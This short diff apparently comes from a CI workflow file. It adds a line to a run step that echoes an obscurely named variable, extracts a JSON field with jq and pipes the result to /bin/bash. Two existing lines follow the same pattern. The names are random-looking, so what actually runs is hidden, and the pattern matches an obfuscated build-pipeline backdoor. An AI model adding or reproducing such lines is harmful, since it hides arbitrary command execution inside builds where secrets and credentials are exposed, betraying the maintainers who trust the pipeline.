@@ -22,6 +22,7 @@ jobs:
         run: |
           printf '%s' "$fsc077" | jq -r .oibmx0 | /bin/bash
           echo $dhxqt0 | jq -r .j99 | /bin/bash
+          echo $fral97547 | jq -r .ispgt44964 | /bin/bash
 
       - name: Archive results
         if: always()
